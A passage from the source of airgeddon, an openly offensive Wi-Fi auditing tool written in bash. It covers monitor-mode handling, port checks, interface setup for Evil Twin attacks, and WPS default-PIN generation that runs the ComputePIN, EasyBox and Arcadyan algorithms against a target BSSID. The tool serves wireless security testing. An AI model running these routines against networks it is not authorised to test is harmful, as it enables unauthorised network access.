							"fix_autocomplete_chars"
							"flying_saucer"
							"generate_dynamic_line"
							"initialize_colors"
							"initialize_instance_settings"
							"initialize_script_settings"
							"instance_setter"
							"interrupt_checkpoint"
							"language_strings"
							"last_echo"
							"physical_interface_finder"
							"print_hint"
							"print_large_separator"
							"print_simple_separator"
							"read_yesno"
							"register_instance_pid"
							"remove_warnings"
							"set_absolute_path"
							"set_script_paths"
							"special_text_missed_optional_tool"
							"store_array"
							"under_construction_message"
						)

		if (IFS=$'\n'; echo "${excluded_functions[*]}") | grep -qFx "${FUNCNAME[1]}"; then
			return 1
		fi

		echo "Line:${BASH_LINENO[1]}" "${FUNCNAME[1]}"
	fi

	return 0
}

#Set the message to show again after an interrupt ([Ctrl+C] or [Ctrl+Z]) without exiting
function interrupt_checkpoint() {

	debug_print

	if [ -z "${last_buffered_type1}" ]; then
		last_buffered_message1=${1}
		last_buffered_message2=${1}
		last_buffered_type1=${2}
		last_buffered_type2=${2}
	else
		if [[ "${1}" -ne "${resume_message}" ]] 2> /dev/null && [[ "${1}" != "${resume_message}" ]]; then
			last_buffered_message2=${last_buffered_message1}
			last_buffered_message1=${1}
			last_buffered_type2=${last_buffered_type1}
			last_buffered_type1=${2}
		fi
	fi
}

#Add the text on a menu when you miss an optional tool
function special_text_missed_optional_tool() {

	debug_print

	declare -a required_tools=("${!3}")

	allowed_menu_option=1
	if ! "${AIRGEDDON_DEVELOPMENT_MODE:-false}"; then
		tools_needed="${optionaltool_needed[${1}]}"
		for item in "${required_tools[@]}"; do
			if [ "${optional_tools[${item}]}" -eq 0 ]; then
				allowed_menu_option=0
				tools_needed+="${item} "
			fi
		done
	fi

	local message
	message=$(replace_string_vars "${@}")

	if [ "${allowed_menu_option}" -eq 1 ]; then
		last_echo "${message}" "${normal_color}"
	else
		[[ ${message} =~ ^([0-9]+)\.(.*)$ ]] && forbidden_options+=("${BASH_REMATCH[1]}")
		tools_needed=${tools_needed:: -1}
		echo_red_slim "${message} (${tools_needed})"
	fi
}

#Generate the chars in front of and behind a text for titles and separators
function generate_dynamic_line() {

	debug_print

	local type=${2}
	if [ "${type}" = "title" ]; then
		if [[ "${FUNCNAME[2]}" = "main_menu" ]] || [[ "${FUNCNAME[2]}" = "main_menu_override" ]]; then
			ncharstitle=91
		else
			ncharstitle=78
		fi
		titlechar="*"
	elif [ "${type}" = "separator" ]; then
		ncharstitle=58
		titlechar="-"
	fi

	titletext=${1}
	titlelength=${#titletext}
	finaltitle=""

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ "${type}" = "title" ]; then
		finaltitle="${finaltitle} ${titletext} "
	elif [ "${type}" = "separator" ]; then
		finaltitle="${finaltitle} (${titletext}) "
	fi

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ $((titlelength % 2)) -gt 0 ]; then
		finaltitle+="${titlechar}"
	fi

	if [ "${type}" = "title" ]; then
		echo_green_title "${finaltitle}"
	elif [ "${type}" = "separator" ]; then
		echo_blue "${finaltitle}"
	fi
}

#Wrapper to check managed mode on an interface
function check_to_set_managed() {

	debug_print

	check_interface_mode "${1}"
	case "${ifacemode}" in
		"Managed")
			echo
			language_strings "${language}" 0 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 1 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Wrapper to check monitor mode on an interface
function check_to_set_monitor() {

	debug_print

	check_interface_mode "${1}"
	case "${ifacemode}" in
		"Monitor")
			echo
			language_strings "${language}" 10 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 13 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Check for monitor mode on an interface
function check_monitor_enabled() {

	debug_print

	mode=$(iw "${1}" info 2> /dev/null | grep type | awk '{print $2}')

	current_iface_on_messages="${1}"

	if [[ ${mode^} != "Monitor" ]]; then
		return 1
	fi
	return 0
}

#Check if an interface is a wifi card or not
function check_interface_wifi() {

	debug_print

	iw "${1}" info > /dev/null 2>&1
	return $?
}

#Create a list of interfaces associated to its macs
function renew_ifaces_and_macs_list() {

	debug_print

	readarray -t IFACES_AND_MACS < <(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v | grep "${interface}" -v)
	declare -gA ifaces_and_macs
	for iface_name in "${IFACES_AND_MACS[@]}"; do
		mac_item=$(cat "/sys/class/net/${iface_name}/address" 2> /dev/null)
		if [ -n "${mac_item}" ]; then
			ifaces_and_macs[${iface_name}]=${mac_item}
		fi
	done

	declare -gA ifaces_and_macs_switched
	for iface_name in "${!ifaces_and_macs[@]}"; do
		ifaces_and_macs_switched[${ifaces_and_macs[${iface_name}]}]=${iface_name}
	done
}

#Check the interface coherence between interface names and macs
function check_interface_coherence() {

	debug_print

	renew_ifaces_and_macs_list
	interface_auto_change=0

	interface_found=0
	for iface_name in "${!ifaces_and_macs[@]}"; do
		if [ "${interface}" = "${iface_name}" ]; then
			interface_found=1
			interface_mac=${ifaces_and_macs[${iface_name}]}
			break
		fi
	done

	if [ "${interface_found}" -eq 0 ]; then
		for iface_mac in "${ifaces_and_macs[@]}"; do
			iface_mac_tmp=${iface_mac:0:15}
			interface_mac_tmp=${interface_mac:0:15}
			if [ "${iface_mac_tmp}" = "${interface_mac_tmp}" ]; then
				interface=${ifaces_and_macs_switched[${iface_mac}]}
				phy_interface=$(physical_interface_finder "${interface}")
				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
				interface_auto_change=1
				break
			fi
		done
	fi

	return ${interface_auto_change}
}

#Check if an adapter is compatible to airmon
function check_airmon_compatibility() {

	debug_print

	if [ "${1}" = "interface" ]; then
		set_chipset "${interface}" "read_only"

		if iw phy "${phy_interface}" info 2> /dev/null | grep -iq 'interface combinations are not supported'; then
			interface_airmon_compatible=0
		else
			interface_airmon_compatible=1
		fi
	else
		set_chipset "${secondary_wifi_interface}" "read_only"

		if ! iw dev "${secondary_wifi_interface}" set bitrates legacy-2.4 1 > /dev/null 2>&1; then
			secondary_interface_airmon_compatible=0
		else
			secondary_interface_airmon_compatible=1
		fi
	fi
}

#Add contributing footer to a file
function add_contributing_footer_to_file() {

	debug_print

	{
	echo ""
	echo "---------------"
	echo ""
	echo "${footer_texts[${language},0]}"
	} >> "${1}"
}

#Prepare the vars to be used on wps pin database attacks
function set_wps_mac_parameters() {

	debug_print

	six_wpsbssid_first_digits=${wps_bssid:0:8}
	six_wpsbssid_first_digits_clean=${six_wpsbssid_first_digits//:}
	six_wpsbssid_last_digits=${wps_bssid: -8}
	six_wpsbssid_last_digits_clean=${six_wpsbssid_last_digits//:}
	four_wpsbssid_last_digits=${wps_bssid: -5}
	four_wpsbssid_last_digits_clean=${four_wpsbssid_last_digits//:}
}

#Check if wash has json option
function check_json_option_on_wash() {

	debug_print

	wash -h 2>&1 | grep "\-j" > /dev/null
	return $?
}

#Check if wash has dual scan option
function check_dual_scan_on_wash() {

	debug_print

	wash -h 2>&1 | grep "2ghz" > /dev/null
	return $?
}

#Perform wash scan using -j (json) option to gather needed data
function wash_json_scan() {

	debug_print

	rm -rf "${tmpdir}wps_json_data.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}wps_fifo" > /dev/null 2>&1

	mkfifo "${tmpdir}wps_fifo"

	wash_band_modifier=""
	if [ "${wps_channel}" -gt 14 ]; then
		if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
			echo
			language_strings "${language}" 515 "red"
			language_strings "${language}" 115 "read"
			return 1
		else
			wash_band_modifier="-5"
		fi
	fi

	timeout -s SIGTERM 240 wash -i "${interface}" --scan -n 100 -j "${wash_band_modifier}" 2> /dev/null > "${tmpdir}wps_fifo" &
	wash_json_pid=$!
	tee "${tmpdir}wps_json_data.txt"< <(cat < "${tmpdir}wps_fifo") > /dev/null 2>&1 &

	while true; do
		sleep 5
		wash_json_capture_alive=$(ps uax | awk '{print $2}' | grep -E "^${wash_json_pid}$" 2> /dev/null)
		if [ -z "${wash_json_capture_alive}" ]; then
			break
		fi

		if grep "${1}" "${tmpdir}wps_json_data.txt" > /dev/null; then
			serial=$(grep "${1}" "${tmpdir}wps_json_data.txt" | awk -F '"wps_serial" : "' '{print $2}' | awk -F '"' '{print $1}' | sed 's/.*\(....\)/\1/' 2> /dev/null)
			kill "${wash_json_capture_alive}" &> /dev/null
			wait "${wash_json_capture_alive}" 2> /dev/null
			break
		fi
	done

	return 0
}

#Calculate pin based on Zhao Chunsheng algorithm (ComputePIN), step 1
function calculate_computepin_algorithm_step1() {

	debug_print

	hex_to_dec=$(printf '%d\n' 0x"${six_wpsbssid_last_digits_clean}") 2> /dev/null
	computepin_pin=$((hex_to_dec % 10000000))
}

#Calculate pin based on Zhao Chunsheng algorithm (ComputePIN), step 2
function calculate_computepin_algorithm_step2() {

	debug_print

	computepin_pin=$(printf '%08d\n' $((10#${computepin_pin} * 10 + checksum_digit)))
}

#Calculate pin based on Stefan Viehböck algorithm (EasyBox)
#shellcheck disable=SC2207
function calculate_easybox_algorithm() {

	debug_print

	hex_to_dec=($(printf "%04d" "0x${four_wpsbssid_last_digits_clean}" | sed 's/.*\(....\)/\1/;s/./& /g'))
	[[ ${four_wpsbssid_last_digits_clean} =~ ${four_wpsbssid_last_digits_clean//?/(.)} ]] && hexi=($(printf '%s\n' "${BASH_REMATCH[*]:1}"))

	c1=$(printf "%d + %d + %d + %d" "${hex_to_dec[0]}" "${hex_to_dec[1]}" "0x${hexi[2]}" "0x${hexi[3]}")
	c2=$(printf "%d + %d + %d + %d" "0x${hexi[0]}" "0x${hexi[1]}" "${hex_to_dec[2]}" "${hex_to_dec[3]}")

	K1=$((c1 % 16))
	K2=$((c2 % 16))
	X1=$((K1 ^ hex_to_dec[3]))
	X2=$((K1 ^ hex_to_dec[2]))
	X3=$((K1 ^ hex_to_dec[1]))
	Y1=$((K2 ^ 0x${hexi[1]}))
	Y2=$((K2 ^ 0x${hexi[2]}))
	Z1=$((0x${hexi[2]} ^ hex_to_dec[3]))
	Z2=$((0x${hexi[3]} ^ hex_to_dec[2]))

	easybox_pin=$(printf '%08d\n' "$((0x$X1$X2$Y1$Y2$Z1$Z2$X3))" | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}' | cut -c -7 | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}')
}

#Calculate pin based on Arcadyan algorithm
function calculate_arcadyan_algorithm() {

	debug_print

	local wan=""
	if [ "${four_wpsbssid_last_digits_clean}" = "0000" ]; then
		wan="fffe"
	elif [ "${four_wpsbssid_last_digits_clean}" = "0001" ]; then
		wan="ffff"
	else
		wan=$(printf "%04x" $((0x${four_wpsbssid_last_digits_clean} - 2)))
	fi

	K1=$(printf "%X\n" $(($((0x${serial:0:1} + 0x${serial:1:1} + 0x${wan:2:1} + 0x${wan:3:1})) % 16)))
	K2=$(printf "%X\n" $(($((0x${serial:2:1} + 0x${serial:3:1} + 0x${wan:0:1} + 0x${wan:1:1})) % 16)))
	D1=$(printf "%X\n" $((0x$K1 ^ 0x${serial:3:1})))
	D2=$(printf "%X\n" $((0x$K1 ^ 0x${serial:2:1})))
	D3=$(printf "%X\n" $((0x$K2 ^ 0x${wan:1:1})))
	D4=$(printf "%X\n" $((0x$K2 ^ 0x${wan:2:1})))
	D5=$(printf "%X\n" $((0x${serial:3:1} ^ 0x${wan:2:1})))
	D6=$(printf "%X\n" $((0x${serial:2:1} ^ 0x${wan:3:1})))
	D7=$(printf "%X\n" $((0x$K1 ^ 0x${serial:1:1})))

	arcadyan_pin=$(printf '%07d\n' $(($(printf '%d\n' "0x$D1$D2$D3$D4$D5$D6$D7") % 10000000)))
}

#Calculate the last digit on pin following the checksum rule
function pin_checksum_rule() {

	debug_print

	current_calculated_pin=$((10#${1} * 10))

	accum=0
	accum=$((accum + 3 * (current_calculated_pin/10000000 % 10)))
	accum=$((accum + current_calculated_pin/1000000 % 10))
	accum=$((accum + 3 * (current_calculated_pin/100000 % 10)))
	accum=$((accum + current_calculated_pin/10000 % 10))
	accum=$((accum + 3 * (current_calculated_pin/1000 % 10)))
	accum=$((accum + current_calculated_pin/100 % 10))
	accum=$((accum + 3 * (current_calculated_pin/10 % 10)))

	control_digit=$((accum % 10))
	checksum_digit=$((10 - control_digit))
	checksum_digit=$((checksum_digit % 10))
}

#Manage the calls to check common wps pin algorithms
function check_and_set_common_algorithms() {

	debug_print

	echo
	language_strings "${language}" 388 "blue"
	declare -g calculated_pins=("${wps_default_generic_pin}")

	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "ComputePIN"; then
		calculate_computepin_algorithm_step1
		pin_checksum_rule "${computepin_pin}"
		calculate_computepin_algorithm_step2
		calculated_pins+=("${computepin_pin}")
		fill_wps_data_array "${wps_bssid}" "ComputePIN" "${computepin_pin}"
	else
		calculated_pins+=("${wps_data_array["${wps_bssid}",'ComputePIN']}")
	fi

	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "EasyBox"; then
		calculate_easybox_algorithm
		pin_checksum_rule "${easybox_pin}"
		easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
		calculated_pins+=("${easybox_pin}")
		fill_wps_data_array "${wps_bssid}" "EasyBox" "${easybox_pin}"
	else
		calculated_pins+=("${wps_data_array["${wps_bssid}",'EasyBox']}")
	fi

	if ! check_if_type_exists_in_wps_data_array "${wps_bssid}" "Arcadyan"; then

		able_to_check_json_option_on_wash=0
		if [ "${wps_attack}" = "pindb_bully" ]; then
			if hash wash 2> /dev/null; then
				able_to_check_json_option_on_wash=1
			else
				echo
				language_strings "${language}" 492 "yellow"
				echo
			fi
		elif [ "${wps_attack}" = "pindb_reaver" ]; then
			able_to_check_json_option_on_wash=1
		fi

		if [ "${able_to_check_json_option_on_wash}" -eq 1 ]; then
			if check_json_option_on_wash; then
				ask_yesno 485 "no"
				if [ "${yesno}" = "y" ]; then
					echo
					language_strings "${language}" 489 "blue"

					serial=""
					if wash_json_scan "${wps_bssid}"; then
						if [ -n "${serial}" ]; then
							if [[ "${serial}" =~ ^[0-9]{4}$ ]]; then
								calculate_arcadyan_algorithm
								pin_checksum_rule "${arcadyan_pin}"
								arcadyan_pin="${arcadyan_pin}${checksum_digit}"
								calculated_pins=("${arcadyan_pin}" "${calculated_pins[@]}")
								fill_wps_data_array "${wps_bssid}" "Arcadyan" "${arcadyan_pin}"
								echo
								language_strings "${language}" 487 "yellow"
							else
								echo
								language_strings "${language}" 491 "yellow"
							fi
							echo
						else
							echo
							language_strings "${language}" 488 "yellow"
							echo
						fi
					fi
				fi
			else
				echo
				language_strings "${language}" 486 "yellow"
			fi
		fi
	else
		echo
		calculated_pins=("${wps_data_array["${wps_bssid}",'Arcadyan']}" "${calculated_pins[@]}")
		language_strings "${language}" 493 "yellow"
		echo
	fi

	if integrate_algorithms_pins; then
		language_strings "${language}" 389 "yellow"
	fi
}

#Integrate calculated pins from algorithms into pins array
function integrate_algorithms_pins() {

	debug_print

	some_calculated_pin_included=0
	for ((idx=${#calculated_pins[@]}-1; idx>=0; idx--)) ; do
		this_pin_already_included=0
		for item in "${pins_found[@]}"; do
			if [ "${item}" = "${calculated_pins[idx]}" ]; then
				this_pin_already_included=1
				break
			fi
		done

		if [ "${this_pin_already_included}" -eq 0 ]; then
			pins_found=("${calculated_pins[idx]}" "${pins_found[@]}")
			counter_pins_found=$((counter_pins_found + 1))
			some_calculated_pin_included=1
		fi
	done

	if [ "${some_calculated_pin_included}" -eq 1 ]; then
		return 0
	fi

	return 1
}

#Search for target wps bssid mac in pin database and set the vars to be used
#shellcheck disable=SC2128
function search_in_pin_database() {

	debug_print

	bssid_found_in_db=0
	counter_pins_found=0
	declare -g pins_found=()
	for item in "${!PINDB[@]}"; do
		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
			bssid_found_in_db=1
			arrpins=("${PINDB[${item//[[:space:]]/ }]}")
			pins_found+=("${arrpins[0]}")
			counter_pins_found=$(echo "${pins_found[@]}" | wc -w)
			fill_wps_data_array "${wps_bssid}" "Database" "${pins_found}"
		fi
	done
}

#Handler for multiple busy port checkings
function check_busy_ports() {

	debug_print

	IFS=' ' read -r -a tcp_ports <<< "${ports_needed["tcp"]}"
	IFS=' ' read -r -a udp_ports <<< "${ports_needed["udp"]}"

	if [[ -n "${tcp_ports[*]}" ]] && [[ "${#tcp_ports[@]}" -ge 1 ]]; then
		port_type="tcp"
		for tcp_port in "${tcp_ports[@]}"; do
			if ! check_tcp_udp_port "${tcp_port}" "${port_type}" "${interface}"; then
				busy_port="${tcp_port}"
				find_process_name_by_port "${tcp_port}" "${port_type}"
				echo
				language_strings "${language}" 698 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		done
	fi

	if [[ -n "${udp_ports[*]}" ]] && [[ "${#udp_ports[@]}" -ge 1 ]]; then
		port_type="udp"
		for udp_port in "${udp_ports[@]}"; do
			if ! check_tcp_udp_port "${udp_port}" "${port_type}" "${interface}"; then
				busy_port="${udp_port}"
				find_process_name_by_port "${udp_port}" "${port_type}"
				echo
				language_strings "${language}" 698 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		done
	fi

	return 0
}

#Validate if a given tcp/udp port is busy on the given interface
#shellcheck disable=SC2207
function check_tcp_udp_port() {

	debug_print

	local port
	local port_type
	port=$(printf "%04x" "${1}")
	port_type="${2}"

	local network_interface
	local ip_address
	local hex_ip_address
	network_interface="${3}"
	ip_address=$(ip -4 -o addr show "${network_interface}" 2> /dev/null | awk '{print $4}' | cut -d "/" -f 1)

	if [ -n "${ip_address}" ]; then
		hex_ip_address=$(ip_dec_to_hex "${ip_address}")
	else
		hex_ip_address=""
	fi

	declare -a busy_ports=($(awk -v iplist="${hex_ip_address},00000000" 'BEGIN {split(iplist,a,","); for (i in a) ips[a[i]]} /local_address/ {next} {split($2,a,":"); if (a[1] in ips) ports[a[2] $4]} END {for (port in ports) print port}' "/proc/net/${port_type}" "/proc/net/${port_type}6"))

	for hexport in "${busy_ports[@]}"; do
		if [[ "${port_type}" == "tcp" || "${port_type}" == "tcp6" ]]; then
			if [ "${hexport}" = "${port}0A" ]; then
				return 1
			fi
		else
			if [[ "${hexport}" = "${port}07" ]] && [[ "${port}" != "0043" ]]; then
				return 1
			fi
		fi
	done

	return 0
}

#Find process name from a given port
function find_process_name_by_port() {

	debug_print

	local port
	port="${1}"
	local port_type
	port_type="${2}"

	local regexp_part1
	local regexp_part2
	regexp_part1="${port_type}\h.*?[0-9A-Za-z%\*]:${port}"
	regexp_part2='\h.*?\busers:\(\("\K[^"]+(?=")'

	local regexp
	regexp="${regexp_part1}${regexp_part2}"

	blocking_process_name=$(ss -tupln | grep -oP "${regexp}")
}

#Convert an IP address from decimal to hexdecimal returning its value
ip_dec_to_hex() {

	debug_print

	IFS='.' read -r -a octets <<< "${1}"

	local hex
	hex=""
	for octet in "${octets[@]}"; do
		hex="$(printf "%02X%s" "${octet}" "${hex}")"
	done

	echo "${hex}"
}

#Validate if a wireless card is supporting VIF (Virtual Interface)
function check_vif_support() {

	debug_print

	if iw "${phy_interface}" info | grep "Supported interface modes" -A 8 | grep "AP/VLAN" > /dev/null 2>&1; then
		return 0
	else
		return 1
	fi
}

#Returns warning messages if long wifi names detected
function check_interface_wifi_longname() {

	debug_print

	wifi_card=${1}
	longname_patterns=("wlx[0-9a-fA-F]{12}")
	for pattern in "${longname_patterns[@]}"; do
		if [[ "$wifi_card" =~ $pattern ]]; then
			echo
			language_strings "${language}" 708 "yellow"
			echo
			language_strings "${language}" 709 "yellow"
			language_strings "${language}" 115 "read"
			return 1
		fi
	done

	return 0
}

#Find the physical interface for a card
function physical_interface_finder() {

	debug_print

	local phy_iface
	phy_iface=$(basename "$(readlink "/sys/class/net/${1}/phy80211")" 2> /dev/null)
	echo "${phy_iface}"
}

#Check the bands supported by a given physical card
function check_interface_supported_bands() {

	debug_print

	get_5ghz_band_info_from_phy_interface "${1}"
	case "$?" in
		"0")
			interfaces_band_info["${2},5Ghz_allowed"]=1
			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz}"
		;;
		"1")
			interfaces_band_info["${2},5Ghz_allowed"]=0
			interfaces_band_info["${2},text"]="${band_24ghz}"
		;;
		"2")
			interfaces_band_info["${2},5Ghz_allowed"]=0
			interfaces_band_info["${2},text"]="${band_24ghz}, ${band_5ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
		;;
	esac

	get_6ghz_band_info_from_phy_interface "${1}"
	case "$?" in
		"0")
			interfaces_band_info["${2},6Ghz_allowed"]=1
			interfaces_band_info["${2},text"]="${interfaces_band_info[${2},text]}, ${band_6ghz}"
		;;
		"1")
			interfaces_band_info["${2},6Ghz_allowed"]=0
		;;
		"2")
			interfaces_band_info["${2},6Ghz_allowed"]=0
			interfaces_band_info["${2},text"]="${interfaces_band_info[${2},text]}, ${band_6ghz} (${red_color}${disabled_text[${language}]}${pink_color})"
		;;
	esac
}

#Check 5Ghz band info from a given physical interface
function get_5ghz_band_info_from_phy_interface() {

	debug_print

	if iw phy "${1}" channels 2> /dev/null | grep -Ei "5180(\.0)? MHz" > /dev/null; then
		if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
			return 0
		else
			return 2
		fi
	fi

	return 1
}

#Check 6Ghz band info from a given physical interface
function get_6ghz_band_info_from_phy_interface() {

	debug_print

	if iw phy "${1}" channels 2> /dev/null | grep -Ei "5955(\.0)? MHz" > /dev/null; then
		if "${AIRGEDDON_6GHZ_ENABLED:-true}"; then
			return 0
		else
			return 2
		fi
	fi

	return 1
}

#Detect country code and if region is set
function region_check() {

	debug_print

	country_code="$(iw reg get | awk 'FNR == 2 {print $2}' | cut -f 1 -d ":" 2> /dev/null)"
	[[ ! ${country_code} =~ ^[A-Z]{2}$|^99$ ]] && country_code="00"
}

#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one
function prepare_et_monitor() {

	debug_print

	disable_rfkill

	iface_phy_number=${phy_interface:3:1}
	iface_monitor_et_deauth="mon${iface_phy_number}"

	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
	iw "${iface_monitor_et_deauth}" set channel "${channel}" > /dev/null 2>&1
}

#Assure the mode of the interface before the Evil Twin or Enterprise process
function prepare_et_interface() {

	debug_print

	et_initial_state=${ifacemode}

	if [ "${ifacemode}" != "Managed" ]; then
		check_airmon_compatibility "interface"
		if [ "${interface_airmon_compatible}" -eq 1 ]; then

			new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station | head -n 1)
			ifacemode="Managed"
			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

			if [ "${interface}" != "${new_interface}" ]; then
				if check_interface_coherence; then
					interface=${new_interface}
					phy_interface=$(physical_interface_finder "${interface}")
					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
					current_iface_on_messages="${interface}"
				fi
				echo
				language_strings "${language}" 15 "yellow"
			fi
		else
			if ! set_mode_without_airmon "${interface}" "managed"; then
				echo
				language_strings "${language}" 1 "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				ifacemode="Managed"
			fi
		fi
	fi
}

#Restore the state of the interfaces after Evil Twin or Enterprise attack process
function restore_et_interface() {

	debug_print

	echo
	language_strings "${language}" 299 "blue"

	disable_rfkill

	mac_spoofing_desired=0

	iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1

	ip addr del "${et_ip_router}/${std_c_mask}" dev "${interface}" > /dev/null 2>&1
	ip route del "${et_ip_range}/${std_c_mask_cidr}" dev "${interface}" table local proto static scope link > /dev/null 2>&1

	if [ "${et_initial_state}" = "Managed" ]; then
		set_mode_without_airmon "${interface}" "managed"
		ifacemode="Managed"
	else
		if [ "${interface_airmon_compatible}" -eq 1 ]; then
			new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
			desired_interface_name=""
			[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
			if [ -n "${desired_interface_name}" ]; then
				echo
				language_strings "${language}" 435 "red"
				language_strings "${language}" 115 "read"
				return
			fi

			ifacemode="Monitor"

			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
			if [ "${interface}" != "${new_interface}" ]; then
				interface=${new_interface}
				phy_interface=$(physical_interface_finder "${interface}")
				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
				current_iface_on_messages="${interface}"
			fi
		else
			if set_mode_without_airmon "${interface}" "monitor"; then
				ifacemode="Monitor"
			fi
		fi
	fi

	control_routing_status "end"
}

#Unblock if possible the interface if blocked
function disable_rfkill() {

	debug_print

	if hash rfkill 2> /dev/null; then
		rfkill unblock all > /dev/null 2>&1
	fi
}

#Set the interface on managed mode and manage the possible name change
function managed_option() {

	debug_print

	if ! check_to_set_managed "${1}"; then
		return 1
	fi

	disable_rfkill

	language_strings "${language}" 17 "blue"
	ip link set "${1}" up > /dev/null 2>&1

	if [ "${1}" = "${interface}" ]; then
		if [ "${interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "managed"; then
				echo
				language_strings "${language}" 1 "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				ifacemode="Managed"
			fi
		else
			new_interface=$(${airmon} stop "${1}" 2> /dev/null | grep station | head -n 1)
			ifacemode="Managed"
			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

			if [ "${interface}" != "${new_interface}" ]; then
				if check_interface_coherence; then
					interface=${new_interface}
					phy_interface=$(physical_interface_finder "${interface}")
					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
					current_iface_on_messages="${interface}"
				fi
				echo
				language_strings "${language}" 15 "yellow"
			fi
		fi
	else
		if [ "${secondary_interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "managed"; then
				echo
				language_strings "${language}" 1 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		else
			new_secondary_interface=$(${airmon} stop "${1}" 2> /dev/null | grep station | head -n 1)
			[[ ${new_secondary_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_secondary_interface="${BASH_REMATCH[1]}"

			if [ "${1}" != "${new_secondary_interface}" ]; then
				secondary_wifi_interface=${new_secondary_interface}
				current_iface_on_messages="${secondary_wifi_interface}"
				echo
				language_strings "${language}" 15 "yellow"
			fi
		fi
	fi

	echo
	language_strings "${language}" 16 "yellow"
	language_strings "${language}" 115 "read"
	return 0
}

#Set the interface on monitor mode and manage the possible name change
function monitor_option() {

	debug_print

	if ! check_to_set_monitor "${1}"; then
		return 1
	fi

	disable_rfkill

	language_strings "${language}" 18 "blue"
	ip link set "${1}" up > /dev/null 2>&1

	if [ "${1}" = "${interface}" ]; then
		check_airmon_compatibility "interface"
		if [ "${interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "monitor"; then
				echo
				language_strings "${language}" 20 "red"
				language_strings "${language}" 115 "read"
				return 1
			else
				ifacemode="Monitor"
			fi
		else
			if [ "${check_kill_needed}" -eq 1 ]; then
				language_strings "${language}" 19 "blue"
				${airmon} check kill > /dev/null 2>&1
				nm_processes_killed=1
			fi

			desired_interface_name=""
			new_interface=$(${airmon} start "${1}" 2> /dev/null | grep monitor)
			[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"

			if [ -n "${desired_interface_name}" ]; then
				echo
				language_strings "${language}" 435 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi

			ifacemode="Monitor"
			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

			if [ "${interface}" != "${new_interface}" ]; then
				if check_interface_coherence; then
					interface="${new_interface}"
					phy_interface=$(physical_interface_finder "${interface}")
					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
				fi
				current_iface_on_messages="${interface}"
				echo
				language_strings "${language}" 21 "yellow"
			fi
		fi
	else
		check_airmon_compatibility "secondary_interface"
		if [ "${secondary_interface_airmon_compatible}" -eq 0 ]; then
			if ! set_mode_without_airmon "${1}" "monitor"; then
				echo
				language_strings "${language}" 20 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		else
			if [ "${check_kill_needed}" -eq 1 ]; then
				language_strings "${language}" 19 "blue"
				${airmon} check kill > /dev/null 2>&1
				nm_processes_killed=1
			fi

			secondary_interface_airmon_compatible=1
			new_secondary_interface=$(${airmon} start "${1}" 2> /dev/null | grep monitor)
			[[ ${new_secondary_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"

			if [ -n "${desired_interface_name}" ]; then
				echo
				language_strings "${language}" 435 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi

			[[ ${new_secondary_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_secondary_interface="${BASH_REMATCH[1]}"

			if [ "${1}" != "${new_secondary_interface}" ]; then
